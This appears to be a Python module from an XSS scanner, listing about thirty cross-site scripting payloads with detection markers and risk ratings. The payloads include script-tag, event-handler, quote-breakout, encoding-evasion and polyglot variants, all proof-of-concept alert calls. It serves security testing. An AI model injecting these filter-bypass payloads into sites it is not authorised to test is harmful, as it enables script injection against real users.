# payloads.py
# Curated XSS payload library grouped by injection context.
# Each payload carries a set of markers used for reflection/execution detection.

PAYLOADS = [
    # ------------------------------------------------------------------ BASIC
    {
        "id": "B001",
        "name": "Basic script alert",
        "category": "Basic",
        "payload": "<script>alert(1)</script>",
        "markers": ["<script>alert(1)</script>", "alert(1)"],
        "desc": "Classic reflected payload. Any reflection of `alert(1)` inside a script-context sink is highly suspicious.",
        "risk": "High",
    },
    {
        "id": "B002",
        "name": "Document domain alert",
        "category": "Basic",
        "payload": "<script>alert(document.domain)</script>",
        "markers": ["<script>alert(document.domain)</script>", "document.domain"],
        "desc": "Proves the injected script runs on the target origin.",
        "risk": "High",
    },
    {
        "id": "B003",
        "name": "Case-mutated script",
        "category": "Basic",
        "payload": "<ScRiPt>alert(1)</ScRiPt>",
        "markers": ["<scr", "ipt>alert(1)", "alert(1)"],
        "desc": "Tests case-insensitive parsing and naive filter bypass.",
        "risk": "High",
    },
    {
        "id": "B004",
        "name": "Nested script (filter evasion)",
        "category": "Basic",
        "payload": "<scr<script>ipt>alert(1)</script>",
        "markers": ["alert(1)", "<scr", "ipt>"],
        "desc": "Bypasses naive blacklist filters that strip `<script>`.",
        "risk": "High",
    },
    # ----------------------------------------------------------- ATTRIBUTE / TAG
    {
        "id": "A001",
        "name": "Img onerror (ace)",
        "category": "Tag/Event",
        "payload": "<img src=x onerror=alert(1)>",
        "markers": ["<img", "src=x", "onerror=alert(1)", "alert(1)"],
        "desc": "Fires when the broken image fails to load.",
        "risk": "High",
    },
    {
        "id": "A002",
        "name": "SVG onload",
        "category": "Tag/Event",
        "payload": "<svg onload=alert(1)>",
        "markers": ["<svg", "onload=alert(1)", "alert(1)"],
        "desc": "Inline SVG fires onload without user interaction.",
        "risk": "High",
    },
    {
        "id": "A003",
        "name": "Breakout double quote",
        "category": "Tag/Event",
        "payload": '"><script>alert(1)</script>',
        "markers": ['"><script>alert(1)</script>', "alert(1)", '">'],
        "desc": "Breaks out of a double-quoted attribute/value context.",
        "risk": "High",
    },
    {
        "id": "A004",
        "name": "Breakout single quote",
        "category": "Tag/Event",
        "payload": "'><img src=x onerror=alert(1)>",
        "markers": ["'><img", "src=x", "onerror=alert(1)", "alert(1)"],
        "desc": "Breaks out of a single-quoted context.",
        "risk": "High",
    },
    {
        "id": "A005",
        "name": "Event handler in attribute",
        "category": "Tag/Event",
        "payload": '" onmouseover="alert(1)',
        "markers": ["onmouseover=", "alert(1)"],
        "desc": "Injects a new event attribute into an existing tag.",
        "risk": "Medium",
    },
    {
        "id": "A006",
        "name": "onerror via closing tag",
        "category": "Tag/Event",
        "payload": "</script><script>alert(1)</script>",
        "markers": ["</script><script>", "alert(1)", "<script>alert(1)"],
        "desc": "Tries to close an open script block and open a new one.",
        "risk": "High",
    },
    {
        "id": "A007",
        "name": "iframe srcdoc",
        "category": "Tag/Event",
        "payload": "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "markers": ["<iframe", "srcdoc", "alert(1)"],
        "desc": "Browser executes content inside srcdoc attribute.",
        "risk": "High",
    },
    # ---------------------------------------------------------------- JS CONTEXT
    {
        "id": "J001",
        "name": "JS quote breakout",
        "category": "JS Context",
        "payload": "';alert(1);//",
        "markers": ["';alert(1);", "alert(1)"],
        "desc": "Breaks out of a JS string literal.",
        "risk": "High",
    },
    {
        "id": "J002",
        "name": "JS double quote breakout",
        "category": "JS Context",
        "payload": '";alert(1);//',
        "markers": ['";alert(1);', "alert(1)"],
        "desc": "Breaks out of a double-quoted JS string.",
        "risk": "High",
    },
    {
        "id": "J003",
        "name": "JS backtick breakout",
        "category": "JS Context",
        "payload": "`;alert(1)//",
        "markers": ["`;alert(1);", "alert(1)"],
        "desc": "Breaks out of a template literal.",
        "risk": "High",
    },
    {
        "id": "J004",
        "name": "JS comment termination",
        "category": "JS Context",
        "payload": "</script><script>alert(1)</script>",
        "markers": ["</script>", "<script>", "alert(1)"],
        "desc": "Terminates a script block regardless of surrounding JS.",
        "risk": "High",
    },
    {
        "id": "J005",
        "name": "JSON break + eval",
        "category": "JS Context",
        "payload": "',alert(1),'",
        "markers": ["alert(1)", "',alert(1),'"],
        "desc": "Exploits unquoted expressions inside JSON-in-JS sinks.",
        "risk": "Medium",
    },
    # ----------------------------------------------------------- ENCODING EVASION
    {
        "id": "E001",
        "name": "Obfuscated alert",
        "category": "Encoding",
        "payload": "<script>a\\u006cert(1)</script>",
        "markers": ["a\\u006cert(1)", "alert(1)"],
        "desc": "JS unicode escape for `l`; bypasses naive keyword filters.",
        "risk": "High",
    },
    {
        "id": "E002",
        "name": "Hex char img src",
        "category": "Encoding",
        "payload": "<img src=x onerror=\\x61lert(1)>",
        "markers": ["\\x61lert(1)", "onerror=", "alert(1)"],
        "desc": "Hex escapes inside an event handler body.",
        "risk": "High",
    },
    {
        "id": "E003",
        "name": "HTML numeric entity alert",
        "category": "Encoding",
        "payload": "<script>&#97;lert(1)</script>",
        "markers": ["&#97;lert(1)", "alert(1)"],
        "desc": "HTML entities decoded before JS parse.",
        "risk": "Medium",
    },
    {
        "id": "E004",
        "name": "Encoded-once tag",
        "category": "Encoding",
        "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "markers": ["<script>alert(1)</script>", "alert(1)"],
        "desc": "URL-encoded payload; tests double-decoding by the app.",
        "risk": "Medium",
    },
    {
        "id": "E005",
        "name": "Double URL encode",
        "category": "Encoding",
        "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "markers": ["%3Cscript%3E", "<script>alert(1)", "alert(1)"],
        "desc": "Encoded twice; tests triple-decoding paths.",
        "risk": "Low",
    },
    {
        "id": "E006",
        "name": "Whitespace obfuscation",
        "category": "Encoding",
        "payload": "<img src=x onerror=\talert(1)>",
        "markers": ["src=x", "onerror=", "alert(1)"],
        "desc": "Tabs inside tags are legal HTML whitespace.",
        "risk": "Medium",
    },
    {
        "id": "E007",
        "name": "Null byte prefix",
        "category": "Encoding",
        "payload": "\x00<script>alert(1)</script>",
        "markers": ["alert(1)", "<script>"],
        "desc": "Legacy filter bypass; several backends strip after NUL.",
        "risk": "Low",
    },
    # ------------------------------------------------------------- POLYGLOT/MISC
    {
        "id": "P001",
        "name": "Polyglot img/event",
        "category": "Polyglot",
        "payload": '"><img src=x onerror=alert(1)>',
        "markers": ['"><img', "src=x", "onerror=alert(1)", "alert(1)"],
        "desc": "Works in attr, tag, and some JS string contexts.",
        "risk": "High",
    },
    {
        "id": "P002",
        "name": "Universal polyglot",
        "category": "Polyglot",
        "payload": "';alert(1);//\\\"><svg onload=alert(1)>",
        "markers": ["alert(1)", "onload=alert(1)"],
        "desc": "Multipart payload covering tag + JS string contexts.",
        "risk": "High",
    },
    {
        "id": "P003",
        "name": "Body onload injection",
        "category": "Polyglot",
        "payload": '</body><html><script>alert(1)</script>',
        "markers": ["</body><html>", "alert(1)"],
        "desc": "Injects after closing body for late-render targets.",
        "risk": "High",
    },
    {
        "id": "P004",
        "name": "Metacharacter scan",
        "category": "Scanner",
        "payload": '"><img src=x onerror=alert(1);document.write({{META}})>',
        "markers": ["document.write", "{{META}}", "onerror=", "alert(1)"],
        "desc": "Probes reflection with a unique token for echo-scanning.",
        "risk": "Info",
    },
    # --------------------------------------------------------------- DUMP/INFO
    {
        "id": "I001",
        "name": "Echo reflection scanner",
        "category": "Scanner",
        "payload": "XSSZz9v5x=1",
        "markers": ["XSSZz9v5x=1", "XSSZz9v5x", "z9v5x"],
        "desc": "Unique non-executable token to map where the input echoes back.",
        "risk": "Info",
    },
    {
        "id": "I002",
        "name": "Unique DOM marker",
        "category": "Scanner",
        "payload": "DOMXSS-MARKER-7733",
        "markers": ["DOMXSS-MARKER-7733"],
        "desc": "Used to spot client-side reflection in the rendered DOM.",
        "risk": "Info",
    },
]


GROUPS = ["Basic", "Tag/Event", "JS Context", "Encoding", "Polyglot", "Scanner"]


def get_payloads(categories=None, ids=None):
    """Return payloads filtered by category list or explicit ids."""
    result = list(PAYLOADS)
    if categories:
        result = [p for p in result if p["category"] in categories]
    if ids:
        result = [p for p in result if p["id"] in ids]
    return result


def payload_catalog():
    """Payload list serializable to the frontend."""
    return [
        {
            "id": p["id"],
            "name": p["name"],
            "category": p["category"],
            "payload": p["payload"],
            "risk": p["risk"],
            "desc": p["desc"],
        }
        for p in PAYLOADS
    ]